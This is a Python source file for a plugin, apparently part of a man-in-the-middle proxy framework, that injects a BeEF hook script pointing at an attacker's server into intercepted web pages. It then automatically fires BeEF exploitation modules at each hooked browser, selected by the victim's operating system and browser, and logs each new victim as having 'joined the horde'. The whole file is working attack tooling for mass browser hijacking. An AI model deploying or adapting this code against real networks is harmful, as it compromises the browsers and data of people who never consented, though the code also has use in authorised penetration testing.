from plugins.plugin import Plugin
from plugins.Inject import Inject
from time import sleep
import sys
import json
import threading
import logging
import libs.beefapi as beefapi

try:
    from configobj import ConfigObj
except:
    sys.exit('[-] configobj library not installed!')

requests_log = logging.getLogger("requests")  #Disables "Starting new HTTP Connection (1)" log message
requests_log.setLevel(logging.WARNING)


class BeefAutorun(Inject, Plugin):
	name = "BeEFAutorun"
	optname = "beefauto"
	has_opts = True
	desc = "Injects BeEF hooks & autoruns modules based on Browser or OS type"

	def initialize(self, options):
		self.options = options
		self.autoruncfg =  options.autoruncfg
		self.hookip = options.hookip
		self.beefip = options.beefip
		self.beefport = options.beefport
		self.beefuser = options.beefuser
		self.beefpass = options.beefpass
		self.dis_inject = options.dis_inject

		beef = beefapi.BeefAPI({"host": self.beefip, "port": self.beefport})
		if beef.login(self.beefuser, self.beefpass):
			print "[*] Successfully logged in to BeEF"
		else:
			sys.exit("[-] Error logging in to BeEF!")

		userconfig = ConfigObj(self.autoruncfg)
		self.Mode = userconfig['mode']

		self.All_modules = userconfig["ALL"]
		self.Targeted_modules = userconfig["targets"]

		if self.dis_inject:
			if not self.hookip:
				sys.exit("[-] BeEFAutorun requires --hookip")
			Inject.initialize(self, options)
			self.count_limit = 1
			self.html_payload = '<script type="text/javascript" src="http://%s:%s/hook.js"></script>' % (self.hookip, self.beefport)

		print "[*] BeEFAutorun plugin online => Mode: %s" % self.Mode
		t = threading.Thread(name="autorun", target=self.autorun, args=(beef,))
		t.setDaemon(True)
		t.start()

	def autorun(self, beef):
		already_ran = []
		already_hooked = []
		while True:
			sessions = beef.sessions_online()
			if sessions is not None and len(sessions) > 0:
				for session in sessions:

					if session not in already_hooked:
						info = beef.hook_info(session)
						logging.info("%s >> joined the horde! [id:%s, type:%s-%s, os:%s]" % (info['ip'], info['id'], info['name'], info['version'], info['os']))
						already_hooked.append(session)

					if self.Mode == 'oneshot':
						if session not in already_ran:
							self.execModules(session, beef)
							already_ran.append(session)

					elif self.Mode == 'loop':
						self.execModules(session, beef)
						sleep(10)

			else:
				sleep(1)

	def execModules(self, session, beef):
		session_info = beef.hook_info(session)
		session_ip = session_info['ip']
		hook_browser = session_info['name']
		hook_os = session_info['os']

		if len(self.All_modules) > 0:
			logging.info("%s >> sending generic modules" % session_ip)
			for module, options in self.All_modules.items():
				mod_id = beef.module_id(module)
				resp = beef.module_run(session, mod_id, json.loads(options))
				if resp["success"] == 'true':
					logging.info('%s >> sent module %s' % (session_ip, mod_id))
				else:
					logging.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
				sleep(0.5)

		logging.info("%s >> sending targeted modules" % session_ip)
		for os in self.Targeted_modules:
			if (os in hook_os) or (os == hook_os):
				browsers = self.Targeted_modules[os]
				if len(browsers) > 0:
					for browser in browsers:
						if browser == hook_browser:
							modules = self.Targeted_modules[os][browser]
							if len(modules) > 0:
								for module, options in modules.items():
									mod_id = beef.module_id(module)
									resp = beef.module_run(session, mod_id, json.loads(options))
									if resp["success"] == 'true':
										logging.info('%s >> sent module %s' % (session_ip, mod_id))
									else:
										logging.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
									sleep(0.5)

	def add_options(self, options):
		options.add_argument('--hookip', dest='hookip', help="Hook IP")
		options.add_argument('--beefip', dest='beefip', default='127.0.0.1', help="IP of BeEF's server [default: localhost]")
		options.add_argument('--beefport', dest='beefport', default='3000', help="Port of BeEF's server [default: 3000]")
		options.add_argument('--beefuser', dest='beefuser', default='beef', help='Username for beef [default: beef]')
		options.add_argument('--beefpass', dest='beefpass', default='beef', help='Password for beef [default: beef]')
		options.add_argument('--autoruncfg', type=file, default="./config_files/beefautorun.cfg", help='Specify a config file [default: beefautorun.cfg]')
		options.add_argument('--disable-inject', dest='dis_inject', action='store_true', default=True, help='Disables automatically injecting the hook url')
